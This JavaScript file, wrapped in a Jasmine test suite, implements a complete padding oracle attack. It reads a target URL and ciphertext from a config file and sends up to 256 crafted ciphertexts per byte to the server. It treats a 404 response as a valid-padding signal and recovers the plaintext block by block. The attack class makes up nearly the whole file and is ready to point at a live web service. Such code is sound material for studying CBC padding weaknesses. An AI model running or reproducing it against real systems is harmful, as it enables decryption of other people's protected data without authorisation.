const http = require('http');
const { readFile, writeFile } = require('./helper');

const FOLDER = 'padding-oracle-attack';
const CONFIG_PATH = `${FOLDER}/data.json`;
const OUTPUT_PATH = `${FOLDER}/result.json`;
const BLOCK_SIZE = 32;
const BLOCK_REG = new RegExp(`.{${BLOCK_SIZE}}`, 'g');

describe('Padding Oracle Attack', () => {
  let shouldPending = false;

  beforeAll(() => {
    jasmine.DEFAULT_TIMEOUT_INTERVAL = 60 * 60 * 1000;
  });

  it('should found config file and set up correct', () => {
    const config = readFile(CONFIG_PATH);

    expect(config).toBeTruthy();
    expect(config.url).toBeTruthy();
    expect(config.path).toBeTruthy();
    expect(config.queryKey).toBeTruthy();
    expect(config.cypher).toBeTruthy();
    shouldPending = false;
  });

  it('must get non 404 response status if sending wrong cypher to website', async () => {
    const config = readFile(CONFIG_PATH);

    try {
      const attacker = new PaddingOracleAttack(config);
      const decryptSuccess = await attacker.sendRequest('some-random-cypher');

      expect(decryptSuccess).toBeFalse();
      shouldPending = false;
    } catch (err) {
      fail(err.message);
    }
  });

  it('start!', async () => {
    const config = readFile(CONFIG_PATH);

    try {
      const attacker = new PaddingOracleAttack(config);
      const decrypted = await attacker.start();

      const plainText = attacker.getPlainText();

      expect(plainText.length).toBe(decrypted.length / 2);
      writeFile(OUTPUT_PATH, plainText);
      shouldPending = false;
    } catch (err) {
      fail(err.message);
    }
  });

  beforeEach(() => {
    if (shouldPending) {
      pending('you should handle up the environment');
    }
    shouldPending = true;
  });

  afterAll(() => {
    if (!shouldPending) {
      const result = readFile(OUTPUT_PATH);
      console.log(`\nFound plain text:\n${result}`);
    }
  });
});

class PaddingOracleAttack {
  constructor(config) {
    this.initialize(config.cypher, config.decrypted);
    this.setUpRequest(config.url, config.path, config.queryKey);
    this.logger = new Logger(
      this.decrypteds.length * BLOCK_SIZE + this.decrypted.length,
      (this.cyphers.length - 1) * BLOCK_SIZE,
    );
  }

  initialize(cypher, decrypted) {
    decrypted = decrypted ? decrypted : '';

    this.cyphers = cypher.match(BLOCK_REG);
    if (!this.cyphers) {
      throw new Error('you must give me correct cypher to attack');
    }

    const doneBlock = Math.floor(decrypted.length / BLOCK_SIZE);
    this.decrypteds = decrypted.slice(-doneBlock * BLOCK_SIZE).match(BLOCK_REG);
    this.decrypteds = this.decrypteds ? this.decrypteds : [];
    this.decrypted = decrypted.slice(0, -doneBlock * BLOCK_SIZE);
    this.paddingValue = this.decrypted.length / 2 + 1;
    this.hexIndex = BLOCK_SIZE - this.paddingValue * 2;
    // 1~cyphers.length-1
    this.blockStart = this.cyphers.length - this.decrypteds.length - 1;
    // check correct cypher condition
    if (this.decrypteds.length === 0 && decrypted) {
      this.setUpCorrectPad();
      if (this.paddingValue === this.correctPad) {
        checkCorrectPaddingValue();
        this.paddingValue++;
        this.hexIndex -= 2;
      }
    }

    if (decrypted || this.decrypteds.length) {
      console.log(`Original Message: ${this.getPlainText()}`);
    }
  }

  setUpRequest(url, path, queryKey) {
    this.url = url;
    this.path = `/${path}?${queryKey}=`;
  }

  async start() {
    // 1~cyphers.length - 1
    for (this.blockIndex = this.blockStart; this.blockIndex; this.blockIndex--) {
      await this.startCypher();

      console.log(`Current Plain Text: ${this.getPlainText()}\n`);

      this.decrypteds.unshift(this.decrypted);
      this.decrypted = '';
    }

    return this.decrypteds.join('');
  }

  async startCypher() {
    for (; this.hexIndex >= 0; this.hexIndex -= 2) {
      await this.startHex();

      this.paddingValue++;

      this.logger.incrementCurrent();
    }
    this.hexIndex = BLOCK_SIZE - 2;
    this.paddingValue = 1;

    return this.decrypted;
  }

  async startHex() {
    if (this.blockIndex === this.cyphers.length - 1) {
      // if it is correct padding we already know what is correct decrypted value!
      if (this.paddingValue === this.correctPad) {
        return this.updateByCorrectPaddingValue();
      }
    }

    const preNoNeed = '0'.repeat(this.hexIndex);
    const postPaddedCorrect = '00'.toHex()
      .xorWith(this.paddingValue)
      .repeat(this.paddingValue - 1)
      .toHex()
      .xorWith(this.decrypted)
      // post cypher block, must have!
      .concat(this.cyphers[this.blockIndex]);
    // console.log(postPaddedCorrect, '-', postPaddedCorrect.length);

    for (let hexValue = 0; hexValue < 256; hexValue++) {
      if (hexValue % 16 === 0) {
        this.logger.show(hexValue / 256 * 100);
      }

      const cypher = preNoNeed
        .concat(hexValue.toHex())
        .concat(postPaddedCorrect);

      // if integrity failed, means padding is correct!
      if (await this.sendRequest(cypher)) {
        const foundDecrypted = '00'.toHex().xorWith(hexValue ^ this.paddingValue);
        this.decrypted = foundDecrypted.concat(this.decrypted);

        process.stdout.write(` - found ${foundDecrypted}\n`);
        break;
      }

      if (hexValue === 255) {
        // if not very first time
        if (this.hexIndex !== BLOCK_SIZE - 2 ||
          this.blockIndex !== this.cyphers.length - 1) {
          throw new Error(`Not found in block: ${this.blockIndex}, hex: ${this.hexIndex}`);
        } else {
          this.correctPad = 1;
        }
      }
    }

    // try get correct padding value on original cypher to ignore correct padding
    if (!this.correctPad) {
      this.setUpCorrectPad();
    }
  }

  sendRequest(cypher) {
    return new Promise((resolve, reject) => {
      const path = `${this.path}${cypher}`;

      const request = http.request(this.url, { path }, (response) => {
        // if padding success but wrong integrity return 404, else return 403
        resolve(response.statusCode === 404);
      });

      request.on('error', reject);

      request.end();
    });
  }

  setUpCorrectPad() {
    this.correctPad = this.cyphers.slice(-2)[0]
      .toHex(BLOCK_SIZE / 2 -1)
      .xorWith(this.decrypted.substr(-2))
      .toHex().num[0];
  }

  updateByCorrectPaddingValue() {
    const correctDecrypted = this.cyphers.slice(-2)[0]
      .toHex(BLOCK_SIZE / 2 - this.correctPad)
      .xorWith(this.correctPad);
    console.log(`correct padding value decrypted is: ${correctDecrypted}`);

    this.decrypted = correctDecrypted.concat(this.decrypted);
  }

  getPlainText() {
    const decrypted = this.decrypted.concat(this.decrypteds.join(''));
    const cyphers = this.cyphers.slice(0, -1).join('').substr(-decrypted.length);
    return decrypted.toHex()
      .xorWith(cyphers)
      .toHex().toChar().join('')
      .slice(0, -this.correctPad);
  }
}

class Logger {
  constructor(current, total) {
    this.total = total;
    this.current = current;
  }

  incrementCurrent() {
    this.current += 2;
  }

  show(local) {
    process.stdout.clearLine();
    process.stdout.cursorTo(0);

    const pertentage = (this.current / this.total * 100).toFixed(1);
    process.stdout.write(`Padding Oracle Attack - total: ${pertentage}%, current: ${local.toFixed(0)}%`);
  }
}
